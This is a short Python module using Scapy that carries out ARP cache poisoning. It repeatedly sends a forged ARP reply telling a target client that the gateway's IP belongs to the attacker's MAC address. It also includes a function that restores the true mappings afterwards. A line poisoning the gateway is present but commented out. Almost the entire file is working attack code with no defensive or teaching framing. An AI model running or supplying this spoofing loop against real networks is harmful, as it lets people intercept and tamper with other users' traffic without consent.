from scapy.all import send
from time import sleep
from scapy.layers.l2 import Ether, ARP

clientIp = None
clientMac = None
gatewayIp = None
gatewayMac = None
myIp = None
myMac = None


stopFlag1 = False

## change arp table of gateway, target ##
def spoofing():
    #packetForGateway = ARP(op=2, psrc=clientIp, hwsrc=myMac, pdst=gatewayIp, hwdst=gatewayMac)
    packetForClient = ARP(op=2, psrc=gatewayIp, hwsrc=myMac, pdst=clientIp, hwdst=clientMac)
    
    global stopFlag1
    try:
        while(not stopFlag1):
            #send(packetForGateway, verbose=False)
            send(packetForClient, verbose=False)
            
            sleep(2)
    except Exception as err:
        print(err)
        restore()
        print('Program will die')
        exit(-1)
        
## restore arp table ##
def restore():
    packetForClient = ARP(op=2, pdst=clientIp, hwdst=clientMac, psrc=gatewayIp, hwsrc=gatewayMac)
    packetForGateway = ARP(op=2, pdst=gatewayIp, hwdst=gatewayMac, psrc=clientIp, hwsrc=clientMac)
    
    send(packetForClient)
    send(packetForGateway)
    
def set_variables(a, b, c, d, e, f):
    global clientIp, clientMac, gatewayIp, gatewayMac, myIp, myMac
    clientIp = a
    clientMac = b
    gatewayIp = c
    gatewayMac = d
    myIp = e
    myMac = f